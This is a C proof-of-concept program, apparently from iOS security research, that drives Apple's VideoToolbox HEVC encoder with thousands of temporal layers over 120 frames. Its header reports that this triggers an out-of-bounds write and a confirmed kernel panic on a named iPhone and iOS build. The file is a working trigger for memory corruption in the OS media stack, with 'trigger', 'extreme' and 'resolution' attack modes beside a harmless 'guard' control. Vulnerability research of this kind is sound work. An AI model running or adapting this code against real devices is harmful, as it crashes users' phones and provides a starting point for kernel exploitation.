/*
 * ave_temporal_trigger.c — Multi-frame HEVC encode with excessive temporal layers
 *
 * Target: iPhone Duo (A20 Pro), iOS 27.1
 * Purpose: Educational research - trigger temporal layer OOB write
 *
 * Temporal layers require MULTIPLE frames to exercise:
 * - Single I-frame doesn't use temporal references
 * - P/B frames reference different temporal layers
 * - OOB write occurs when encoder processes per-layer structures
 *
 * Encodes 120 frames (4 seconds at 30fps) with 16463 temporal layers.
 *
 * CONFIRMED: Trigger mode (16463 layers, 120 frames) causes kernel panic
 * on iPhone Duo (A20 Pro, iOS 27.1 build 24A94232). Guard mode (2 layers,
 * 30 frames) completes all frames successfully.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <VideoToolbox/VideoToolbox.h>
#include <CoreVideo/CoreVideo.h>
#include <CoreMedia/CoreMedia.h>

static FILE *out;
static int frames_completed = 0;
static int frames_errored = 0;

static void p(const char *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    vfprintf(out, fmt, ap);
    va_end(ap);
    fflush(out);
}

static void encode_callback(void *ref, void *src, OSStatus status,
                            VTEncodeInfoFlags flags, CMSampleBufferRef buf) {
    if (status == noErr) {
        frames_completed++;
        if (frames_completed % 10 == 0)
            p("[*] Frames completed: %d\n", frames_completed);
    } else {
        frames_errored++;
        p("[!] Frame callback error: %d (completed=%d)\n", (int)status, frames_completed);
    }
}

static int trigger_temporal(int num_frames, int temporal_layers, int width, int height) {
    p("[*] Creating HEVC session: %dx%d, %d temporal layers, %d frames\n",
      width, height, temporal_layers, num_frames);

    VTCompressionSessionRef session = NULL;
    OSStatus status = VTCompressionSessionCreate(
        kCFAllocatorDefault, width, height, kCMVideoCodecType_HEVC,
        NULL, NULL, NULL, encode_callback, NULL, &session);

    if (status != noErr || !session) {
        p("[-] Session create failed: %d\n", (int)status);
        return -1;
    }
    p("[+] Session created\n");

    VTSessionSetProperty(session, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);

    int keyint = 30;
    CFNumberRef keyRef = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &keyint);
    VTSessionSetProperty(session, kVTCompressionPropertyKey_MaxKeyFrameInterval, keyRef);
    CFRelease(keyRef);

    p("[*] Setting NumberOfTemporalLayers = %d\n", temporal_layers);
    CFNumberRef layerCount = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &temporal_layers);
    status = VTSessionSetProperty(session, CFSTR("NumberOfTemporalLayers"), layerCount);
    CFRelease(layerCount);
    p("  SetProperty returned: %d\n", (int)status);

    float fraction = 0.5f;
    CFNumberRef fracRef = CFNumberCreate(kCFAllocatorDefault, kCFNumberFloat32Type, &fraction);
    status = VTSessionSetProperty(session, CFSTR("BaseLayerFrameRateFraction"), fracRef);
    CFRelease(fracRef);
    p("  BaseLayerFrameRateFraction: %d\n", (int)status);

    status = VTCompressionSessionPrepareToEncodeFrames(session);
    if (status != noErr) {
        p("[-] Prepare failed: %d\n", (int)status);
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        return -1;
    }
    p("[+] Prepared\n");

    CVPixelBufferRef pixelBuffer = NULL;
    CVReturn cvStatus = CVPixelBufferCreate(
        kCFAllocatorDefault, width, height,
        kCVPixelFormatType_32BGRA, NULL, &pixelBuffer);
    if (cvStatus != kCVReturnSuccess) {
        p("[-] PixelBuffer failed: %d\n", (int)cvStatus);
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        return -1;
    }
    p("[+] PixelBuffer: %zu bytes\n", CVPixelBufferGetDataSize(pixelBuffer));

    CVPixelBufferLockBaseAddress(pixelBuffer, 0);
    void *base = CVPixelBufferGetBaseAddress(pixelBuffer);
    if (base) {
        size_t dataSize = CVPixelBufferGetDataSize(pixelBuffer);
        memset(base, 0x41, dataSize);
    }
    CVPixelBufferUnlockBaseAddress(pixelBuffer, 0);

    p("[!] Encoding %d frames with %d temporal layers...\n", num_frames, temporal_layers);
    p("[!] This exercises P/B frame temporal references\n");

    for (int i = 0; i < num_frames; i++) {
        CMTime pts = CMTimeMake(i, 30);
        CMTime dur = CMTimeMake(1, 30);
        VTEncodeInfoFlags flags = 0;

        if (i > 0 && base) {
            CVPixelBufferLockBaseAddress(pixelBuffer, 0);
            uint8_t *pixels = (uint8_t *)CVPixelBufferGetBaseAddress(pixelBuffer);
            if (pixels) {
                pixels[0] = (uint8_t)(i & 0xFF);
                pixels[1] = (uint8_t)((i >> 8) & 0xFF);
            }
            CVPixelBufferUnlockBaseAddress(pixelBuffer, 0);
        }

        status = VTCompressionSessionEncodeFrame(
            session, pixelBuffer, pts, dur, NULL, NULL, &flags);

        if (status != noErr) {
            p("[!] EncodeFrame %d failed: %d\n", i, (int)status);
            if (i == 0) {
                p("[-] First frame failed, aborting\n");
                break;
            }
        }

        if (i > 0 && i % 30 == 0) {
            p("[*] Submitted %d frames, completed=%d, errors=%d\n",
              i, frames_completed, frames_errored);
            usleep(100000);
        }
    }

    p("[*] All frames submitted. Flushing...\n");
    VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
    p("[+] Flush complete. Total: submitted=%d, completed=%d, errors=%d\n",
      num_frames, frames_completed, frames_errored);

    VTCompressionSessionInvalidate(session);
    CFRelease(session);
    CVPixelBufferRelease(pixelBuffer);

    return 0;
}

int main(int argc, char *argv[]) {
    char path[1024];
    const char *home = getenv("HOME");
    if (!home) home = "/tmp";
    snprintf(path, sizeof(path), "%s/Documents/ave_output.txt", home);
    out = fopen(path, "w");
    if (!out) { out = fopen("/tmp/ave_output.txt", "w"); }
    if (!out) return 1;

    p("=== AVE Temporal Layer Trigger v4 ===\n");
    p("PID: %d, UID: %d\n", getpid(), getuid());
    char buf[256]; size_t len;
    len = sizeof(buf); sysctlbyname("kern.osversion", buf, &len, NULL, 0);
    p("kern.osversion: %s\n", buf);
    len = sizeof(buf); sysctlbyname("hw.machine", buf, &len, NULL, 0);
    p("hw.machine: %s\n\n", buf);

    const char *mode = (argc >= 2) ? argv[1] : "trigger";

    if (strcmp(mode, "trigger") == 0) {
        p("[!] TRIGGER MODE: 120 frames, 16463 temporal layers, HEVC 1920x1080\n\n");
        trigger_temporal(120, 16463, 1920, 1080);
    } else if (strcmp(mode, "mild") == 0) {
        p("[*] MILD MODE: 60 frames, 9 temporal layers, HEVC 1920x1080\n\n");
        trigger_temporal(60, 9, 1920, 1080);
    } else if (strcmp(mode, "extreme") == 0) {
        p("[!] EXTREME MODE: 120 frames, 65535 temporal layers, HEVC 1920x1080\n\n");
        trigger_temporal(120, 65535, 1920, 1080);
    } else if (strcmp(mode, "resolution") == 0) {
        p("[!] RESOLUTION MODE: 60 frames, 16463 layers, HEVC 4096x2160\n\n");
        trigger_temporal(60, 16463, 4096, 2160);
    } else if (strcmp(mode, "guard") == 0) {
        p("[*] GUARD MODE: 30 frames, 2 temporal layers, HEVC 1920x1080\n\n");
        trigger_temporal(30, 2, 1920, 1080);
    } else {
        p("Modes: trigger, mild, extreme, resolution, guard\n");
    }

    p("\n=== Done ===\n");
    fclose(out);
    return 0;
}
